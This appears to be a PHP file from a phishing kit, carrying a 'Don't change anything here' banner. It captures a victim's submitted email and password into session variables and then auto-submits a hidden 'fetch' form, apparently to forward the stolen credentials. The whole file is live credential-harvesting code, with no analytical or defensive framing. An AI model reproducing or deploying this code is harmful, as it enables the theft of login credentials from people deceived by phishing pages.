<?
###################################
// Don't change anything here
##################################
ini_set("output_buffering",4096);
session_start();
?>
<script type="text/javascript" src="content/validate.js"></script> 
<?



$_SESSION['radio'] = $radio = $_POST['create'];

$_SESSION['TheEmail'] = $email = $_POST['emaillo'];
$_SESSION['ThePassword'] = $pass = $_POST['passcode'];


?>
<?php if(!empty($_POST)){?>
<script>document.write(form);document.fetch.submit()</script> 
<?php  }?>